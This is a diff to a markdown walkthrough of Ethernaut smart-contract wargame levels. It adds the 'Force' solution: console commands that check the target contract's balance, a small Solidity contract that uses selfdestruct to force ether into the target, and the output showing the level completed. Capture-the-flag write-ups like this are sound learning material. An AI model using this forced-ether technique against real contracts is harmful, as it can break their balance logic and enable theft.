@@ -112,3 +112,32 @@ contract TelephoneHack {
 
 > await.contract.owner()
 < '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
+```
+
+## 7.Force
+```
+> contract.address
+< '0x66e13a83e49793BD0C441aE9347Fa7E3a783d745'
+
+> await getBalance('0x66e13a83e49793BD0C441aE9347Fa7E3a783d745')
+> '0'
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract ForceHack{
+
+
+    function transferTo(address payable _address) public payable {
+
+        selfdestruct(_address);
+    }
+}
+
+> await getBalance('0x66e13a83e49793BD0C441aE9347Fa7E3a783d745')
+> '0.000000000000000011'
+
+☚ (<‿<)☚ Well done, You have completed this level!!!
+```
+## 8.
